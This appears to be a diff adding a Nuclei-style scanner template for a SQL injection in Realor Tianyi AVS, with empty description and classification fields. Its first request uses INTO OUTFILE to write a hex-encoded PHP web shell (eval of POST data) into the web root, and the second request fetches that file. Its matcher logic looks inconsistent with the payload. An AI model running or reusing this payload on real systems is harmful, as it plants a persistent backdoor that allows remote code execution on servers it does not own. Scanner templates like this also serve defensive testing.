@@ -1,0 +1,35 @@
+id: realor_tianyi_avs_demo_sql_injection
+info:
+  name: Realor Tianyi AVS Demo SQL Injection
+  author: Blame Team
+  severity: high
+  description: ''
+  reference: []
+  classification:
+    cvss-metrics: ''
+    cvss-score: 0.0
+    cve-id: ''
+    cwe-id: ''
+  tags: ''
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.php"
+  random_str: "{{rand_base(8)}}"
+  match_str: "{{md5(random_str)}}"
+
+requests:
+  - raw:
+      - |
+        GET /index.php?s=/Index/dologin/name/demo%27)%3bselect%20unhex%28%273c3f70687020406576616c28245f504f53545b315d293b3f3e%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5C{{file_name}}%27%23/pwd/123123 HTTP/1.1
+
+      - |
+        GET {{file_name}} HTTP/1.1           
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200
+          - status_code_2==200
+          - trim_space(body_2)=="{{match_str}}"
+        condition: and    
